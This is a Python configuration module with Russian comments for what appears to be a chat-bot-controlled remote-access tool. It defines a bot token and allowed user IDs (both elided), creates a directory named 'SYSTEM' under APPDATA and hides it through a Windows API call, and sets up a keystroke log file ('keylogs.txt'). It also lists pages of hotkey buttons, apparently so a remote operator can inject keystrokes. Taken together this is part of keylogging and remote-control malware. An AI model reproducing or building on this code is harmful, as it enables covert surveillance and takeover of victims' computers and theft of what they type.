import os
import sys
import ctypes

# Основные настройки
KNOWN_IDS = ['...']
TOKEN = '...'

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.join(os.environ['APPDATA'], 'SYSTEM')
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Пути
USER = os.environ.get("USERNAME")
APPDATA = os.environ.get("APPDATA")
LOG_DIR = os.path.join(BASE_DIR, 'logs')
SCRIPTS_DIR = os.path.join(BASE_DIR, 'scripts')

# Файлы логов
LOG_FILE = os.path.join(LOG_DIR, 'user_log.txt')
KEYLOG_FILE = os.path.join(LOG_DIR, 'keylogs.txt')

os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCRIPTS_DIR, exist_ok=True)

# Делаем скрытую папку
FILE_ATTRIBUTE_HIDDEN = 0x02
ctypes.windll.kernel32.SetFileAttributesW(BASE_DIR, FILE_ATTRIBUTE_HIDDEN)

# Горячие клавиши
HOTKEY_PAGES = [
    [
        ("Ctrl+C", "ctrl+c"),
        ("Ctrl+V", "ctrl+v"),
        ("Ctrl+X", "ctrl+x"),
        ("Ctrl+Z", "ctrl+z"),
        ("Ctrl+A", "ctrl+a"),
        ("Ctrl+S", "ctrl+s"),
        ("Alt+Tab", "alt+tab"),
        ("Alt+F4", "alt+f4"),
        ("Next ➡️", "page_1")
    ],
    [
        ("Win", "win"),
        ("Win+E", "win+e"),
        ("Win+D", "win+d"),
        ("Win+L", "win+l"),
        ("Win+V", "win+v"),
        ("Tab", "tab"),
        ("Enter", "enter"),
        ("⬅️ Back", "page_0"),
        ("Next ➡️", "page_2")
    ],
    [
        ("Ctrl+T", "ctrl+t"),
        ("Ctrl+W", "ctrl+w"),
        ("Ctrl+Shift+T", "ctrl+shift+t"),
        ("Ctrl+L", "ctrl+l"),
        ("F5", "f5"),
        ("Ctrl+F", "ctrl+f"),
        ("Backspace", "backspace"),
        ("Esc", "esc"),
        ("Space", "space"),
        ("⬅️ Back", "page_1")
    ]
]